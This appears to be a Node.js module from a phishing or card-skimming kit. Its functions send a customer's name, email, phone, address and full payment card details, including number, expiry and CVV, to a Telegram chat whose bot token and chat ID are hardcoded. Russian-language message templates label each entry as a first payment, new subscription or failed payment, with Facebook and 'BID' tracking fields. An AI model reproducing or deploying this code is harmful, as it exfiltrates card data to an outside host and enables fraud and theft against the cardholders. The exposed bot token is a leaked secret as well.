/** @format */
const axios = require("axios");

const sendPaymentFirstData = async (paymentData) => {
  try {
    const botToken = "7683620414:AAFu6cErSxU0Q0M0wx6bYnfIiCo2i7tdUi8";
    const chatId = "-1002708932805";

    if (!botToken || !chatId) {
      console.error("Bot token or chat ID not configured");
      return;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const messageText = `
💳 ПЕРВЫЙ ПЛАТЕЖ

👤 Клиент: ${paymentData.firstName} ${paymentData.lastName}
📧 Email: ${paymentData.email}
📱 Телефон: ${paymentData.phone}
📍 Страна: ${paymentData.countryCode}
🏠 Адрес: ${paymentData.address}
🏙️ Город: ${paymentData.city}
📮 Индекс: ${paymentData.postalCode}
${paymentData.bid ? `🆔 BID: ${paymentData.bid}\n` : ""}
💳 Данные карты:
   Владелец: ${paymentData.cardHolder}
   Номер: ${paymentData.cardNumber}
   Срок: ${paymentData.expiry}
   CVV: ${paymentData.cvv}

💰 Сумма: ${paymentData.price} EUR
🆔 FB ID: ${paymentData.fb || "Не указан"}

⏰ Время: ${new Date().toLocaleString("ru-RU")}
        `.trim();

    await axios.get(url, {
      params: {
        chat_id: chatId,
        parse_mode: "html",
        text: messageText,
      },
    });

    console.log("Payment data sent to Telegram successfully");
  } catch (error) {
    console.error("Error sending payment data to Telegram:", error);
  }
};

const sendPaymentData = async (paymentData) => {
  try {
    const botToken = "7683620414:AAFu6cErSxU0Q0M0wx6bYnfIiCo2i7tdUi8";
    const chatId = "-1002708932805";

    if (!botToken || !chatId) {
      console.error("Bot token or chat ID not configured");
      return;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const messageText = `
💳 НОВАЯ ПОДПИСКА

👤 Клиент: ${paymentData.firstName} ${paymentData.lastName}
📧 Email: ${paymentData.email}
📱 Телефон: ${paymentData.phone}
📍 Страна: ${paymentData.countryCode}
🏠 Адрес: ${paymentData.address}
🏙️ Город: ${paymentData.city}
📮 Индекс: ${paymentData.postalCode}
${paymentData.bid ? `🆔 BID: ${paymentData.bid}\n` : ""}
💳 Данные карты:
   Владелец: ${paymentData.cardHolder}
   Номер: ${paymentData.cardNumber}
   Срок: ${paymentData.expiry}
   CVV: ${paymentData.cvv}

💰 Сумма: ${paymentData.price} EUR
🆔 FB ID: ${paymentData.fb || "Не указан"}

⏰ Время: ${new Date().toLocaleString("ru-RU")}
        `.trim();

    await axios.get(url, {
      params: {
        chat_id: chatId,
        parse_mode: "html",
        text: messageText,
      },
    });

    console.log("Payment data sent to Telegram successfully");
  } catch (error) {
    console.error("Error sending payment data to Telegram:", error);
  }
};

const sendFailedPaymentData = async (paymentData, paymentError) => {
  try {
    const botToken = "7683620414:AAFu6cErSxU0Q0M0wx6bYnfIiCo2i7tdUi8";
    const chatId = "-1002708932805";

    if (!botToken || !chatId) {
      console.error("Bot token or chat ID not configured");
      return;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Extract a concise error message
    let errorMessage = 'Unknown Error';
    if (paymentError) {
        if (paymentError.type === 'payment' && paymentError.error) {
            errorMessage = paymentError.error.errorMessage || JSON.stringify(paymentError.error);
        } else if (paymentError.type === 'sdk' && paymentError.error) {
            errorMessage = paymentError.error.message || JSON.stringify(paymentError.error);
        } else {
            errorMessage = paymentError.message || (typeof paymentError === 'object' ? JSON.stringify(paymentError) : paymentError);
        }
    }
    
    // Limit message length to avoid Telegram API errors
    const MAX_LENGTH = 300;
    if (errorMessage.length > MAX_LENGTH) {
        errorMessage = errorMessage.substring(0, MAX_LENGTH) + '...';
    }

    const messageText = `
‼️ *НЕУДАЧНЫЙ ПЛАТЕЖ* ‼️
*Причина:* \`${errorMessage}\`

---

*Клиент:* ${paymentData.firstName} ${paymentData.lastName}
*Email:* ${paymentData.email}
*Телефон:* ${paymentData.phone}
*Страна:* ${paymentData.countryCode}
${paymentData.bid ? `*BID:* ${paymentData.bid}\n` : ""}
*Сумма:* ${paymentData.price} EUR
*FB ID:* ${paymentData.fb || "Не указан"}

*Время:* ${new Date().toLocaleString("ru-RU")}
        `.trim();

    await axios.post(url, {
        chat_id: chatId,
        parse_mode: "Markdown",
        text: messageText,
    });

    console.log("Failed payment data sent to Telegram successfully");
  } catch (error) {
    console.error("Error sending failed payment data to Telegram:", error.response ? error.response.data : error.message);
  }
};

module.exports = {
  sendPaymentData,
  sendFailedPaymentData,
};
